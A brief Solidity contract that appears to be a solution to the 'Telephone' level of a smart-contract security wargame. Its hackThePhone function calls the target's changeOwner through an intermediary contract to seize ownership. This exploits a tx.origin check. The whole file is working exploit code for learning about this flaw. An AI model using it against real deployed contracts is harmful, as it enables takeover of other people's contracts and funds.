pragma solidity ^0.5.1;

import "./Telephone.sol";

contract TelephoneSol {
    Telephone private telephone;

    constructor(address _telephoneAddress) public {
        telephone = Telephone(_telephoneAddress);
    }

    function hackThePhone() public {
        telephone.changeOwner(msg.sender);
    }
}
